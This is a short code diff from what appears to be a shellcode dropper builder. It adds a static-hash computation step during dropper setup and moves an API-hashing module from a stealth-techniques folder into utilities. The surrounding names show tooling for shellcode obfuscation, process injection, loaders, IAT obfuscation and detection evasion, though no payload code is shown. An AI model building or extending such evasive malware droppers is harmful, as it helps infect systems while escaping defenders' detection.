@@ -5,6 +5,7 @@ from datetime import datetime
 from api.droppers.models import DropperModel
 from ..shellcode import obfuscate_shellcode, shellcode_to_header, CASCADE_STUB, clean_shellcode, file_to_shellcode
 from api.droppers.services.github import fetch_github_ressource
+from .hashing import compute_static_hashes
 
 
 logger = logging.getLogger(__name__)
@@ -24,6 +25,9 @@ def setup_dropper(tmp_dir, dropper_config):
         
         # Fill in configuration headers with provided data
         fill_config_header(dropper_config, tmp_dir)
+
+        # Compute static hashes
+        compute_static_hashes(os.path.join(tmp_dir))
         
         # Remove debug code if not in debug mode
         if not dropper_config.get('debug_mode'):
@@ -89,10 +93,10 @@ def _get_required_source_files(preprocessing_macros):
         'modules/entropy/entropy.c',
         'modules/injectors/injectors.c',
         'modules/loaders/loaders.c',
-        'modules/stealth_techniques/api_hashing.c',
         'modules/stealth_techniques/iat_obfuscation.c',
         'modules/entropy/entropy.c',
         'modules/entropy/custom_win_api.c',
+        'utils/api_hashing.c',
         'utils/debug.c',
         'utils/hardware_breakpoints.c',
         'utils/process_utils.c',
